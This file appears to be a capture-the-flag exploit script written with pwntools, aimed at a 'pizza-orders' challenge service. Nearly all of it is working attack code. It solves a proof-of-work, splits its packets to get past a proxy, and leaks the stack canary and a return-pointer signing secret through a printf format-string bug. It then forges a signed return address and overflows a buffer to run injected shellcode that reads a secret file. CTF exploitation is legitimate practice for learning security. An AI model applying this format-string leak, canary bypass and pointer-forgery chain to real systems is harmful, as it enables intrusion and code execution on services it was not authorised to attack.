import re
import time
import hashlib
import string
from pwn import *

context.arch = 'amd64'

HOST = os.environ.get("HOST", "pizza-orders.challs.teamitaly.eu")
PORT = int(os.environ.get("PORT", 15008))

p = remote(HOST, PORT)


def num_to_charseq(num, charset=string.ascii_letters):
    res = ""
    while True:
        if num < len(charset):
            res += charset[num]
            break
        res += charset[num % len(charset)]
        num //= len(charset)
    return res


def solve_pow(init_str, end_hash):
    num = 0
    while True:
        try_solve = init_str + num_to_charseq(num)
        if hashlib.sha256(try_solve.encode('ascii')).hexdigest().lower().endswith(end_hash.lower()):
            return try_solve
        num += 1


# Solve PoW (this can be activated or deactivated)
if p.recvuntil(b"Give me a string", timeout=0.5):
    proc = log.progress('PoW Required, solving...')
    p.recvuntil(b"starting in ")
    init_string = p.recvuntil(b" ")[:-1]
    p.recvuntil(b"ends in ")
    hash_end = p.recvuntil(b".")[:-1]
    p.sendline(solve_pow(init_string.decode(), hash_end.decode()).encode())
    proc.success('PoW Solved, Starting Exploit')
else:
    log.info("PoW not required, starting exploit")

log.info("Monkey Patching send_raw to bypass 'laproxy'")
p.original_send_raw = p.send_raw


def monkey_patched_send_raw(data):
    data = to_bytes(data)
    for i in range(0, len(data), 2):
        p.original_send_raw(data[i:i+2 if i+2 <= len(data) else len(data)])
        time.sleep(.05)  # Avoid TCP packets aggregation


p.send_raw = monkey_patched_send_raw

# Transform whatever you pass into bytes


def to_bytes(v):
    if isinstance(v, bytes):
        return v
    return str(v).encode()

# Send a command in the menu


def sendcmd(num):
    p.sendlineafter(b"> ", to_bytes(num))

# Send multiple commands in the menu


def sendcmds(*nums):
    [sendcmd(num) for num in nums]

# Send order details


def sendorderdetails(title, content):
    p.sendlineafter(b"> ", to_bytes(title))
    p.sendlineafter(b"> ", to_bytes(content))

# Add an order


def addorder(title, content):
    sendcmd(1)
    sendorderdetails(title, content)

# Get the result of a printf vuln (useful for dumping the stack)


def printfvuln(text):
    sendcmds(2, 20)
    sendorderdetails("FOO", text)
    sendcmds(4, 20)
    delimiter = b"***********************************\n"
    p.recvuntil(delimiter)
    p.recvuntil(delimiter)
    return p.recvuntil(delimiter)[:-len(delimiter)].decode()

# Get bytes from a address in int format


def get_bytes(addr, n=8):
    mask = 0xff
    for b_num in range(n):
        yield (addr & mask) >> (b_num*8)
        mask <<= 8

# Calculate the secret thanks to the information in the stack


def calc_secret():
    search_result = printfvuln("%p."*40).split(".")[37:39]
    bp, ret = search_result
    bp, ret = int(bp, 16), int(ret, 16)
    sign = ret >> (8*6)  # Take signature bytes
    clean_ret = ret & (~(0xffff << (8*6)))
    sign_bytes = list(get_bytes(clean_ret)) + list(get_bytes(bp))
    for ele in sign_bytes:
        sign ^= ele
        sign ^= ele << 8
    return sign  # Now this is calculated the secret

# Get the canary thanks to the information in the stack


def get_canary():
    return int(printfvuln("%p."*40).split(".")[26], 16)

# Taken the base pointer and the return pointer, calculate the stack signed return pointer


def sign_calc(ret, sec, bp=0xdeadbeefdeadbeef):
    for byte in list(get_bytes(ret)) + list(get_bytes(bp)):
        sec ^= byte
        sec ^= byte << 8
    ret |= sec << (8*6)
    return pack(bp, 64)+pack(ret, 64)


log.info("Checking service availability")
if not p.recvuntil(b"Choose an option:", timeout=3):
    exit("Server not responding")

proc = log.progress("Crafting shellcode to get the flag")
shellcode_payload = asm(
    # cat2 uses legal system calls, cat use sendfile syscall that is illegal
    shellcraft.cat2("./pizza_secret_recipe") +
    shellcraft.exit(0)  # Exit carefully the program (optional)
)
proc.success("Done")

proc = log.progress("Sending order value with the shellcode")
addorder("GIMME THE FLAG!", shellcode_payload)
proc.success("Done")

sendcmds(2, 0, -1, 7)
log.info("Deleted order 0 containing the SAFE MODE value, activated unsafe functions")

sendcmds(4, 1)
p.recvuntil(b"Advanced details: ")
shellcode_addr = int(p.recvline(), 16)+20
log.info("Get shellcode address: {}".format(hex(shellcode_addr)))

secret = calc_secret()
log.info("Calculated secret: {}".format(hex(secret)))

canary = get_canary()
log.info("Leaked canary: {}".format(hex(canary)))

new_signature = sign_calc(shellcode_addr, secret)
log.info("New return address and base pointer with signature: {}".format(
    new_signature.hex()))

# Sending the malicious payload
# --> Here there are multiple canaries, so I spammed them here and used as padding
proc = log.progress("Sending malicious payload")
p.sendline(b"A"*10+p64(canary)*3+new_signature)
proc.success("Done")
# "A"*10 = buffer of _readline
# p64(canary)*3 = 3 canaries + padding
# sign_calc(shellcode_addr, secret) = return address signed

p.recvuntil(b"> ")  # Wait for the menu

secret_menu = p.recvall().decode()

# Here will be printed and filtered the flag
log.info("FLAG: "+"".join(re.findall(r"flag{.*}", secret_menu)))
